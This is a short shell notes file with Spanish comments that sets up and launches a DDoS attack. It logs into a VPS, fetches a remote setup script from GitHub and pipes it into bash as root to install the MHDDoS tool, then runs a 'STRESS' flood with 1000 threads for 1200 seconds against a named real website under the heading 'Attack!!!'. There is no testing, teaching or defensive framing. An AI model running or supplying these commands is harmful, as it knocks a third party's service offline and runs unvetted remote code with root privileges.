# Iniciar SSH a VPS
ssh <IP> -l ddos

# Cambiar a root y ejecutar
sudo -i
curl https://raw.githubusercontent.com/pedroflor/EH-PT-RT-Varios/master/setup-mhddos.sh | bash

# Cambiar a usuario "ddos"
exit
cd MHDDoS/
> proxy.list

# Attack!!!
python3 start.py STRESS https://www.datec.com.bo/ 1 1000 proxy.list 1000 1200
